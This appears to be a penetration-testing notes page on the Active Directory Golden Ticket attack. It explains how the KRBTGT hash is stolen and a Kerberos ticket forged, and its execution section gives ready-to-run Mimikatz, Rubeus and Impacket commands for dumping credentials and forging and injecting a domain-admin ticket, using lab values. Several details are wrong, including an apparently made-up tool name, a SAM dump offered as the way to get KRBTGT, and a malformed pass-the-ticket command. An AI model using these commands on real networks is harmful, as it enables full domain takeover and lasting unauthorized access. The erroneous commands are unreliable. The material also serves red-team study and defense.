# Golden Ticket

## Overview

A Golden Ticket attack is a type of attack in Microsoft Active Directory (AD) environments where an attacker forges a Kerberos ticket (TGT – Ticket Granting Ticket) to impersonate any user, typically a Domain Admin, within the Active Directory domain. This attack enables the attacker to gain unauthorized access to resources and escalate privileges, allowing them to move freely within the network.

## How Golden Ticket Attacks Work:
1. **KRBTGT Account:** The KRBTGT account is a special account used by the **Domain Controller (DC)** to encrypt and sign all Kerberos tickets. The NTLM hash of this account is a crucial part of the Golden Ticket attack.
   
2. **Attacker's Goal:** The attacker needs to gain access to the **KRBTGT NTLM hash**. This can be achieved through:
   - **Dumping Active Directory hashes** using tools like **Mimikatz** or **Kerberos Exploitation (kerb2)**.
   - **Compromising a Domain Controller** and extracting the hash directly from the DC.

3. **Forging the Golden Ticket:**
   - Once the attacker has the KRBTGT NTLM hash, they can use it to forge a **Golden Ticket**.
   - The **Golden Ticket** is created with the attacker’s desired information, such as impersonating a **Domain Admin**.
   - The ticket is forged using tools like **Mimikatz**, which takes the **KRBTGT hash**, the target user’s information, and creates a valid TGT.

4. **Accessing Resources:** The forged TGT is then used by the attacker to request service tickets (TGS) for access to various resources, such as domain controllers, file shares, etc. The ticket is accepted by the KDC because it is signed using the KRBTGT account’s NTLM hash, making it appear legitimate.

5. **Persistence:** The attacker can use the Golden Ticket for as long as they wish, provided the **KRBTGT password** is not changed. The attacker can maintain persistent access to the domain even if their original access is detected and revoked, until the KRBTGT password is reset.

## Tools Used in Golden Ticket Attacks:

- **Mimikatz:** A popular tool used for extracting the KRBTGT NTLM hash and forging Golden Tickets.
- **Impacket:** A toolkit that includes tools to interact with Kerberos and perform attacks, such as forging tickets.
- **Rubeus:** A powerful tool that can be used for Kerberos ticket extraction and manipulation, including creating Golden Tickets.

## Attack Requirements

The attacker needs the krbtgt NT hash almost always acquired through a DCSync attack

## Attack Result

New ticket (golden ticket) that has access to all of the domain

## Attack Execution

### Mimikatz

First, dump the KRBTGT NTLM hash using Mimikatz:

    mimikatz.exe "privilege::debug" "lsadump::sam" exit

    or

    mimikatz # lsadump::lsa /inject /name:krbtgt

Use the extracted NTLM hash to create a Golden Ticket:

    mimikatz.exe "kerberos::ptt /user:Administrator /rc4:<KRBTGT NTLM HASH> /domain:example.com /sid:<DOMAIN SID> /ticket:<BASE64 ENCODED TICKET>"
    mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

    or using rubeus

    .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

    or using impacket

    ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker


## More Information

https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden